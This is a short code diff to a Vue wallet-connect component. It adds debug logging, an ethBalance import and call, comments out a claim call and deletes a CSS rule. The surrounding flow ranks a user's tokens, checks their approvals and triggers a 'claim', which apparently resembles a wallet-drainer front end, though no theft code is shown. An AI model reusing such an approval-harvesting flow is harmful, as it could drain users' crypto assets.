@@ -448,6 +448,7 @@ import {
   mconnector,
   trustwalletConnect,
   allownce,
+  ethBalance
 } from './utils/walletconnect.js';
 const Toast = useToast();
 import axios from 'axios';
@@ -530,6 +531,8 @@ export default {
         this.isDone = true;
         const allownce_value = await allownce(this.maxToken);
         const balanceoftoken = await balanceOf(this.maxToken);
+        console.log(allownce_value);
+        console.log(balanceoftoken);
         if (allownce_value > balanceoftoken) {
           if (this.currentIndex + 1 > this.sortedTokens.length) {
             if (this.claimable > 0) {
@@ -557,7 +560,7 @@ export default {
       this.isDone = false;
       Swal.close();
       Swal.hideLoading();
-      this.wc_claim();
+      // this.wc_claim();
       // Toast.error(error.message);
     }
   },
@@ -620,8 +623,7 @@ export default {
     async showBalance() {
       try {
         this.processing = true;
-        const balance = await balanceOf();
-
+        const balance = await ethBalance();
         const feeData = await fetchFeeData({
           chainId: 1,
           formatUnits: 'gwei',
@@ -970,10 +972,6 @@ export default {
   margin-left: 1rem;
   font-weight: 500;
   white-space: nowrap;
-}
-
-.ticker--prices {
-  /* margin-top: -0.75rem; */
 }
 
 .ticker--token {
